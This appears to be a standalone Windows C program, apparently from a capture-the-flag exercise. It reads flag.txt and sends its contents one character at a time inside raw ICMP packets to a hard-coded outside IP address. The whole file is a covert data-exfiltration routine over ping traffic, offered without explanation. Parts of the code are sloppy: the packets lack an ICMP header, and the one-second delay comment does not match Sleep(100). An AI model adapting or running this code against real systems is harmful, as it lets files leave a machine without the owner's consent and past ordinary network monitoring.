#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define PING_PKT_SIZE 64

// Initialize Winsock
void init_winsock() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        exit(EXIT_FAILURE);
    }
}

int main() {
    init_winsock();

    FILE *file = fopen("flag.txt", "r");
    if (!file) {
        perror("Error opening flag.txt");
        return 1;
    }

    char target_ip[] = "20.205.243.166"; // IP of guthib.com
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(target_ip);

    char buffer[PING_PKT_SIZE];
    int seq_num = 0;
    char ch;

    while ((ch = fgetc(file)) != EOF) {
        memset(buffer, 0, PING_PKT_SIZE);
        buffer[0] = ch;  // Embed character from flag.txt

        if (sendto(sock, buffer, PING_PKT_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
            printf("Send failed. Error Code: %d\n", WSAGetLastError());
        } else {
            printf("Sent ICMP request with char: %c\n", ch);
        }

        Sleep(100);  // Wait 1 second before the next request
    }

    fclose(file);
    closesocket(sock);
    WSACleanup();
    return 0;
}
